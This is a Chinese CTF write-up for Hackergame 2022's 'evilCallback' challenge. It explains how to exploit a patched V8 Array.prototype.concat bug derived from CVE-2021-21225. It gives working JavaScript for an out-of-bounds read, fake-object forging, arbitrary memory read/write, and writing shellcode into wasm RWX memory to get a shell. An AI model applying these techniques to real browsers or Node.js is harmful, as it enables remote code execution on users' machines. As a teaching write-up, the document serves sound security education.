# evilCallback

题解作者：[eastXueLian](https://github.com/AvavaAYA)

出题人、验题人、文案设计等：见 [Hackergame 2022 幕后工作人员](../../credits.pdf)。

## 题目描述

- 题目分类：binary

- 题目分值：400

NyaRu 要毕业了，苗苗璐很伤心，希望 call her back（在此翻译为：再次找到她）。

幸好苗苗璐已经开发出了极为先进的 AI NyaRu，歌力更是远超原版，现在只差最后的「One Last Kiss 29.0 歌曲资料」（位于 `/flag` 中）就能补完 AI NyaRu，陪伴着苗苗璐一直走下去。

你能通过 NyaRu 电脑上存在漏洞的 V8 程序来运行 `/readflag` 获得 flag 帮助苗苗璐实现「AI NyaRu 补完计划」吗？

注意：**[点击下载题目附件](files/evilCallback.zip)，附件中已经提供了存在漏洞的可执行文件 `executable_d8/d8`，为了得到一致的内存布局，本地调试时不要忘记加上参数 `--max-heap-size 1024`**。

不过，如果你想在这道题目以外进一步挖掘 V8 中各种潜在漏洞，可以参考这份 [V8 调试环境配置指南](files/debugV8-environment.pdf)。

你可以通过 `nc 202.38.93.111 10222` 来连接，或者点击下面的 "打开/下载题目" 按钮通过网页终端与远程交互。

> 如果你不知道 `nc` 是什么，或者在使用上面的命令时遇到了困难，可以参考我们编写的 [萌新入门手册：如何使用 nc/ncat？](https://lug.ustc.edu.cn/planet/2019/09/how-to-use-nc/)

## 题解

> [V8](https://v8.dev/) 是一款[开源](https://github.com/v8/v8)的 JavaScript 引擎，被用在 Google Chrome 和 Chromium 中，同时也是 Node.js 的根本。V8 可以独立运行，也可以嵌入到任何 C++ 应用程序中。以上赘述的几点都是为了表明 V8 漏洞的价值是非常高的。
>
> 这道题的思路来自 [CVE－2021－21225](https://bugs.chromium.org/p/chromium/issues/detail?id=1195977)，漏洞发现者 tiszka 在他的 [blog](https://tiszka.com/) 中非常详细地分析了 Array.prototype.concat 上一系列漏洞的[成因](https://tiszka.com/blog/CVE_2021_21225.html)和[利用思路](https://tiszka.com/blog/CVE_2021_21225_exploit.html)。

#### 漏洞分析

本题 V8 版本为 `9.0.257.19`，检查 [evilCallback.diff](src/evilCallback.diff) 可以发现题目 patch 的点主要是针对 `Array.prototype.concat` 这个内置函数的，结合以下几点：

- 被注释掉的 `HasOnlySimpleElements` 与 `visitor->has_simple_elements()` 检查

- `IterateElements` 函数中三处被注释的 `DisallowJavascriptExecution no_js(isolate);`

- `IterateElements` 函数中关键位置的文字提示

- ~~题目名字 evilCallback~~

可以得到本题的关键在于构造 `Array` 对象，对其调用 `Array.prototype.concat` 时进入 `IterateElements` 函数的循环，期间触发回调（详见下面[源码](src/builtins-array.cc)增加的注释）：

```cpp
    // src/builtins/builtins-array.cc
    // line 1117

    case PACKED_DOUBLE_ELEMENTS: {
      // Disallow execution so the cached elements won't change mid execution.
      // DisallowJavascriptExecution no_js(isolate);            // 这里 patch 后允许了 js 代码的执行（触发 callback）

      // ...
      Handle<FixedDoubleArray> elements(FixedDoubleArray::cast(array->elements()), isolate);
      int fast_length = static_cast<int>(length);               // 进入循环前获取了 array.length，存在变量 fast_length 中
                                                                // 可以思考：如果循环中 length 被改变了会发生什么？
      DCHECK(fast_length <= elements->length());
      FOR_WITH_HANDLE_SCOPE(isolate, int, j = 0, j, j < fast_length, j++, {     // 循环以上面的 fast_length 来判断 i < fast_length

        // 两条分支
        if (!elements->is_the_hole(j)) {
                                                                // （快）
          double double_value = elements->get_scalar(j);        // 这里直接读取了对应内存位置上的值，
                                                                // 若 length 被中途改变会导致越界读（OOB read）               
          Handle<Object> element_value = isolate->factory()->NewNumber(double_value);
          if (!visitor->visit(j, element_value)) return false;
        } 

        else {
          Maybe<bool> maybe = JSReceiver::HasElement(array, j); // （慢）
          if (maybe.IsNothing()) return false;
          if (maybe.FromJust()) {
            // Call GetElement on array, not its prototype, or getters won't
            // have the correct receiver.
            Handle<Object> element_value;
            ASSIGN_RETURN_ON_EXCEPTION_VALUE(
                isolate, element_value,
                JSReceiver::GetElement(isolate, array, j), false);              // 若对应位置为 hole 的话会用 JSReceiver::GetElement 去读，
                                                                // 与上面分支不同的是，这里不是直接获得对应内存位置上的值
                                                                // 而是会去调用 getter，这里有执行 js 代码的机会
            if (!visitor->visit(j, element_value)) return false;
          }
        }
      });
      break;
    }
```

--------

#### 漏洞验证以及内存泄漏

漏洞成因如上，接下来考虑如何触发：

对于有 js 基础的选手可以想到（没有相关经历的选手也可以通过搜索得到）[`Symbol.species`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Symbol/species) 和 [`Object.prototype.valueOf()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/valueOf) 的结合使用，实现以下操作：

- 在访问某个数组元素时触发 callback 来缩小数组的长度

- 触发 garbage collection

    - 原本紧跟在数组元素后的内存内容被复制到数组元素的位置上
    - *在内存大小不同的情况下 gc 的表现会有区别，这也是为什么增加运行参数 `--max-heap-size 1024`*

- 此时就实现了内存越界读，即内存泄漏，代码如下（所有测试代码都在 [`src/poc.js`](src/poc.js) 中，使用 `executable_d8/d8 --allow-natives-syntax --expose-gc --max-heap-size 1024 poc.js` 运行）：

```js
function leak_0() {
// 根据上述思路实现内存泄漏
    // Symbol.species 返回 vulnA
    class vulnArray extends Float64Array {}
    var vulnA = new vulnArray(0x1337);
    vulnA.__defineSetter__("length", function() {});
    class myArray extends Array {
        static get [Symbol.species]() {
            return function() {
                return vulnA;
            }
        };
    }

    var corruptA = new myArray(0x50);
    corruptA.fill(4.3);
    delete corruptA[0];         // 创造空洞，这里进入 JSReceiver::GetElement 的慢过程，
                                // 才能触发 valueOf() 中的代码执行
    Array.prototype[0] = {
        valueOf: function() {
            corruptA.length = 1;// length 设置为 1，
            gc();               // 触发 gc
            print("[CALLBACK]");
            delete Array.prototype[0]; // 防止影响后续利用
            return 1.7;
        }
    };

    // 触发漏洞
    var res = corruptA.concat();

    // 调试 && 漏洞验证
    for (var i = 0; i < 0x10; i++) {
        print(i + "\t" + res[i]);
    }
}

leak_0();
```

可以看到输出了一些可疑的数据：

```sh
❯ ./executable_d8/d8 --max-heap-size 1024 --expose-gc --allow-natives-syntax ./poc.js
[CALLBACK]                          # 证明 callback 被触发并且只被触发了一次，符和预期
0       1.7                         # 这里是 valueOf 的返回值 1.7 而不是原本的 4.3
1       3.3954324972934e-310        # 这些是什么？
2       2.69333861189973e-310
3       2.69333861189973e-310
4       2.2468527337194e-311
5       2.69333861295466e-310
6       8.4880155434e-314
7       2.693338611895e-310
8       2.6933386127274e-310
9       4.15911175029e-312
10      3.39543249543303e-310
11      3.39543249543293e-310
12      2.69333861189973e-310
13      2.69333861189973e-310
14      2.24685272251e-311
15      2.2468527326206e-311
```

事实上 V8 内存中浮点数类型是直接存储并且可以直接转换的（其他类型往往是作为 JSObject 被存储），这也是为什么这里选择了浮点数类型的元素填充数组，以下是转换函数：

```js
var buf =new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var bigUint64 = new BigUint64Array(buf);
function f2i(f) {
    float64[0] = f;
    return bigUint64[0];
}
function i2f(i) {
    bigUint64[0] = i;
    return float64[0];
}
function hex(i) {
    return "0x" + i.toString(16).padStart(16, "0");
}

function dump64(arr, length){
    for (var i = 0; i < length; i++) {
        print("\033[1;33;1m[DEBUG] " + i + "\t" + hex(f2i(arr[i])) + "\033[0m");
    }
}
```

接下来研究 Array 对象在 V8 内存中的表现，运行 [`poc.js`](src/poc.js) 中 `leak_0`函数，使用下面命令进入 gdb 中运行：

```sh
gdb ./executable_d8/d8 -ex "set args --max-heap-size 1024 --expose-gc --allow-natives-syntax ./poc.js" -ex "r"
# 以下为输出
# ...
[STEP 0] Memory leak.
0x09127c1d1081 <JSArray[8]>
```

来到断点前，发现用 `%DebugPrint()` 输出的 Array 地址末位是 1，这在 V8 中表明这是一个 JSObject，其真正指向的地址需要在此基础上减一，使用 `telescope` 查看具体内存情况：

```sh
pwndbg> telescope 0x09127c1d1080 16
00:0000│  0x9127c1d1080 —▸ 0x3917fd903dd1 ◂— 0x4000011f37c6811      # map，决定了如何访问该 JSObject，
                                                                    # 若能通过 oob 修改 map 可以导致类型混淆进一步导致任意地址读写
01:0008│  0x9127c1d1088 —▸ 0x11f37c681309 ◂— 0x11f37c6812           # prototype，指向 prototype 数组
02:0010│  0x9127c1d1090 —▸ 0x9127c1d10b1 ◂— 0x11f37c6821            # elements对象，注意观察可以发现就紧贴着这个 Array 对象
03:0018│  0x9127c1d1098 ◂— 0x800000000                              # length，现在是 8
04:0020│  0x9127c1d10a0 —▸ 0x11f37c6815c9 ◂— 0x2000011f37c6811      # properties
05:0028│  0x9127c1d10a8 ◂— 0xbad0cafedeadbeef
06:0030│  0x9127c1d10b0 —▸ 0x11f37c682161 ◂— 0x11f37c6811           # 上面的 elements 就指向这里
07:0038│  0x9127c1d10b8 ◂— 0x800000000                              # length
08:0040│  0x9127c1d10c0 ◂— 0xbad0cafedeadbeef                       # raw data，存放的就是原始数据
... ↓     7 skipped
```

经过调试分析，可以得到 V8 中的 Array 在内存中有两种布局（二者的区别在于 elements 是在 Array 的上面还是下面）：

```sh
## 第一种（Constructed Array）：
        --------------------------------------------
        +               map (Array)                +
        +------------------------------------------+
        +               prototype                  +
        +------------------------------------------+
        +               elements                   + ----------+
        +------------------------------------------+           | 
        +   length          |           0          +           |
        +------------------------------------------+           |
        +               properties                 +           |
        +------------------------------------------+           |
        +               ...                        +           |
        +------------------------------------------+           |
        +               map (elements)             + <---------+
        +------------------------------------------+
        +   length          |           0          +
        +------------------------------------------+
        +               elem values                +
        +               ....                       +
        +               ....                       +
        +               ....                       +
        --------------------------------------------

## 第二种（Literal Array）：
        --------------------------------------------
        +               map (elements)             + <---------+
        +------------------------------------------+           |
        +   length          |           0          +           |
        +------------------------------------------+           |
        +               elem values                +           |
        +               ....                       +           |
        +               ....                       +           |
        +               ....                       +           |
        +------------------------------------------+           |
        +               map (Array)                +           |
        +------------------------------------------+           |
        +               prototype                  +           |
        +------------------------------------------+           |
        +               elements                   + ----------+
        +------------------------------------------+
        +   length          |           0          +
        +------------------------------------------+
        +               properties                 +
        --------------------------------------------
```

因为漏洞触发后，影响的内存位置从 elements 开始，因此后一种分配方式对这次利用是更有利的，这里提供一种利用构造函数的办法对上面 leak 的方式稍作修改：

```js
function leak_1() {
// 根据上述思路实现内存泄漏

    // Symbol.species 返回 vulnA
    class vulnArray extends Float64Array {}
    var vulnA = new vulnArray(0x1337);
    vulnA.__defineSetter__("length", function() {});
    const constru = new Function();
    constru.__defineGetter__(Symbol.species, ()=>{
        return function() {
            return vulnA;
        }
    });

    var corrupted_array = [
    // HOLEY_DOUBLE_ELEMENTS
           , 1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
        0.1, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
        0.1, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
        0.1, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
        0.1, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
        0.1, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
        0.1, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
        0.1, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
        0.1, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
        0.1, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
    ];
    corrupted_array.constructor = constru;
    
    Array.prototype[0] = {
        valueOf: function() {
            corrupted_array.length = 1;
            gc();
            print("[CALLBACK]");
            delete Array.prototype[0];
            return 4.3;
        }
    };

    var res = corrupted_array.concat();
    dump64(res, 20);
}
```

通过以上利用结合具体调试就可以获得相关内存信息了，具体代码实现在 [`src/exploit.js`](src/exploit.js) 的 `leak` 函数中。

#### 从越界读到越界写

考虑下面这种内存布局：

```sh
        --------------------------------------------
        +               map (elements)             +
        +------------------------------------------+
        +   length          |           0          +
        +------------------------------------------+
        +               elem values                +
        +               ....                       +
        +               ....                       +            
        +               HOLE                       + <----------+
        +               ....                       +            |
        +               ....                       +            |
        +------------------------------------------+            |
        +               map (Array)                +            |
        +------------------------------------------+            |
        +               prototype                  +            |
        +------------------------------------------+            |
        +               elements                   +            |
        +------------------------------------------+            |
        +   length          |           0          +            |
        +------------------------------------------+            |
        +               properties                 +            |
        +------------------------------------------+            |
        +               ...                        +            |
        +------------------------------------------+ Overlap    |
        +       element of another array           + -----------+
        +------------------------------------------+
        +               ...                        +
        --------------------------------------------
```

在按照刚才 leak 时相同的思路触发漏洞时，如果在 gc 过程中已经正好用可控的内容覆盖了上面的空洞，同时这个数组类型为 HOLEY_ELEMENTS（与 leak 中的 HOLEY_DOUBLE_ELEMENTS 不同，包含对象类型的元素），则：

- array 的 length 被修改为 1

- gc 触发，控制 HOLE 的值指向准备好的 `fake_object`

- concat 遍历到 HOLE，进入慢过程，把这个地址当作对象来处理

于是 `fake_object` 就被伪造成功了，不过还得在避免程序 crash 的情况下施展手段把它传出来，为之后的利用创造条件，这里提供一种 `try/catch` 的办法来中途停止 concat，否则它会把之后的内容都视作对象导致程序崩溃：

```js
function overlap() {

    // ...

    Array.prototype[10] = {
        valueOf: function() {
            corrupted_array.length = 1;
            gc();

            print("[SUCCESS] CALLBACK (overlaping)")

            Object.prototype.valueOf = function() {
                // 这里把我们伪造的对象传出来
                g_controlled_arr = this;
                delete Object.prototype.valueOf;
                // 终止 concat 
                throw "Fake object is under cuntrol!";
                return 4.3;
            }
            delete Array.prototype[10];
            return 4.3;
        }
    };

    // ...
}

try {
    overlap();
} catch(e) {
    log(e);
}

```

#### 从越界读写到任意地址读写

至此，我们已经获得了越界读写的能力，内存中有如下状态（示意图，前后关系可能会有区别）：

```sh
---------------------------------------------------------------------------------       
+       map (element of g_fake_obj)                                             + <-----+
+-------------------------------------------------------------------------------+       |
+       length      |           0                                               +       |
+-------------------------------------------------------------------------------+       |
+  controlled data (be set to leaked map)  (var: g_controlled_obj)              +       |
+-------------------------------------------------------------------------------+       |
+  controlled data (be set to leaked pro)  g_controlled_arr pro                 +       |
+-------------------------------------------------------------------------------+       |
+  controlled data (be set to leaked elem) g_controlled_arr elem                +       |
+                       which can be pointed to any place in memory             +       |
+-------------------------------------------------------------------------------+       |
+  controlled data (be set to length)                                           +       | 
+-------------------------------------------------------------------------------+       |
+               ....                                                            +       |
+-------------------------------------------------------------------------------+       |
+        map (var: g_fake_obj)                                                  +       |
+-------------------------------------------------------------------------------+       |
+               prototype                                                       +       |
+-------------------------------------------------------------------------------+       |
+               elements                                                        + ------+
+-------------------------------------------------------------------------------+
+   length          |           0                                               +
+-------------------------------------------------------------------------------+
+               properties                                                      +
---------------------------------------------------------------------------------
```

以上的内存关系赋予我们任意读写的能力，编写如下利用函数：

```js
function getAddr(obj) {
// 获得对象的地址
    g_fake_obj[2] = i2f(g_getAddrArr_addr);
    g_getAddrArr[0] = obj;
    return f2i(g_controlled_arr[0]);
}
function readAddr(addr) {
// 任意地址读，实际上是把被控制数组的 elements 指针指向目标地址，接下来从
    g_fake_obj[2] = i2f(addr - 0x10n);
    return f2i(g_controlled_arr[0]);
}
function writeAddr(addr, data) {
// 任意地址写
    g_fake_obj[2] = i2f(addr - 0x10n);
    g_controlled_arr[0] = i2f(data);
}

```

--------

#### 获取 RWX 权限的内存空间并写入 shellcode

其实任意读写后就有很多办法可以利用了，在这道题中甚至可以去使用非常 "CTF" 的办法——大量 leak memory，找到 libc 基址，改 free_hook 实现 getshell，但是这很不 RealWorld：很难会遇到有人给你开一个 developer shell 来打的情况，因此写入 shellcode 是自由度更大的利用办法，可以实现：

- ~~弹计算器~~（本来这道题有这样的打算：patch 到 chromium 上远程运行选手上传的文件，录屏为 GIF 返回给选手，但后面该计划夭折了~~时间很仓促，出题人经验也不是很足，太麻烦了www~~）

- 执行反弹 shell，这也是最接近实际情况的利用

V8 中有对于 wasm 的支持，因此有任意读写的能力后可以通过写 wasm 并覆盖为 shellcode 的办法来实现 RWX 内存的获取与利用：

先在 [wasdk.github.io](https://wasdk.github.io/WasmFiddle/) 上随便生成一段 wasm code，得到测试 demo：

```js
var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);

var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var f = wasmInstance.exports.main;
var f_addr = getAddr(f);
```

进入 gdb 中分析 wasm 代码存储的地址，发现如下指针引用关系：

```
func 
     -> shared_info
                    -> data 
                            -> instance
                                        -> instance + 0x80: rwx segments
```

因此有如下构造：

```js
var shared_info_addr = readAddr(f_addr + 0x18n);
var wasm_exported_func_data_addr = readAddr(shared_info_addr + 0x8n);
var wasm_instance_addr = readAddr(wasm_exported_func_data_addr + 0x10n);
var rwx_page_addr = readAddr(wasm_instance_addr + 0x80n);
log("leak rwx_page_addr: " + hex(rwx_page_addr));
```

现在已经获得了 RWX 段，shellcode 生成比较常规，直接拿 pwntools 生成就行，可以参考 [src/gen_shellcode.py](src/gen_shellcode.py)。

但是上面使用 FloatArray 进行任意写的时候, 在目标地址高位是 0x7f 等情况下, 会出现低 20 位被置零的现象, 可以通过 DataView 的利用来解决:

```js
var data_buf = new ArrayBuffer(0x200);
var data_view = new DataView(data_buf);
var buf_backing_store_addr = getAddr(data_buf) + 0x20n;

writeAddr(buf_backing_store_addr, rwx_page_addr);
```

---------

至此，调用 `f()` 就可以实现 getshell，完整 exp 见 [src/exp.py](src/exp.py) 和 [src/exploit.js](src/exploit.js)。

#### 后记 & 出题人的碎碎念

> 听说有选手拿其他洞打出来了，膜
>
> 被 patch 版本是去年年初发布的，拿到比赛中确实有点老了，但用这个版本也是希望选手注意到本题漏洞点：`Array.prototype.concat` 函数中的[改动](src/version1819.diff)

出这道题的过程比较曲折，最初确定思路为 V8 pwn 后，盯上了 [CVE-2021-21225](https://bugs.chromium.org/p/chromium/issues/detail?id=1195977)（也可以看一下这个漏洞发现者对这个洞的[分析](https://tiszka.com/blog/CVE_2021_21225.html)) `Array.prototype.concat` 上的一系列漏洞，去除指针压缩是最开始的想法：对于没有相关经验的选手，指针压缩可能会对理解上造成不必要的困扰，也很高兴有不少选手按照预期思路做出来了，希望大家会喜欢这种偏向 Real world 类型的题目*~~这不比卷 glibc 版本有趣多了？~~*。

其实出题过程中的其他版本会比现在复杂一些，包括：

- 在更大内存的环境下运行（gc 表现会有所不同，调试上有一定工作量，不过不是每个选手都能在大于 8G 内存的环境下运行这道题）

- 禁用 valueOf()，这样选手必须思考结合 js 中的 proxy 来实现漏洞触发与利用，这也是这道题第一个成型的版本，但一直没有找到一种不用堆喷射的解法（使用堆喷射之类繁琐的方法显然违背了 hackergame 对新人友好的初衷）

感谢 [zzh1996](https://github.com/zzh1996) 对本题的反复测试并帮助解决非预期解等问题，感谢 [taoky](https://github.com/taoky) 和 [volltin](https://github.com/volltin) 帮助此题解决大型附件的问题，也正是有以上几位前辈的帮助这道题才有机会和大家见面。
